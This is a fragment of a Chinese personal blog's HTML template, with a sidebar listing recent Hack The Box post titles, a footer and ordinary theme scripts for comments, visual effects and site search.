title="HTB-EscapeTwo">HTB-EscapeTwo</a><time datetime="2025-03-24T08:19:34.000Z" title="发表于 2025-03-24 16:19:34">2025-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4bdc74c4.html" title="HTB-Dog"><img src="https://www.dmoe.cc/random.php?8309" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Dog"/></a><div class="content"><a class="title" href="/posts/4bdc74c4.html" title="HTB-Dog">HTB-Dog</a><time datetime="2025-03-24T04:56:37.000Z" title="发表于 2025-03-24 12:56:37">2025-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/72ffed1e.html" title="HTB-Cypher"><img src="https://www.dmoe.cc/random.php?3597" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Cypher"/></a><div class="content"><a class="title" href="/posts/72ffed1e.html" title="HTB-Cypher">HTB-Cypher</a><time datetime="2025-03-23T06:31:58.000Z" title="发表于 2025-03-23 14:31:58">2025-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f5701a7f.html" title="HTB-UnderPass"><img src="https://www.dmoe.cc/random.php?5484" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-UnderPass"/></a><div class="content"><a class="title" href="/posts/f5701a7f.html" title="HTB-UnderPass">HTB-UnderPass</a><time datetime="2025-03-23T05:04:33.000Z" title="发表于 2025-03-23 13:04:33">2025-03-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
+      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
+      avatar: 'monsterid',
+      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
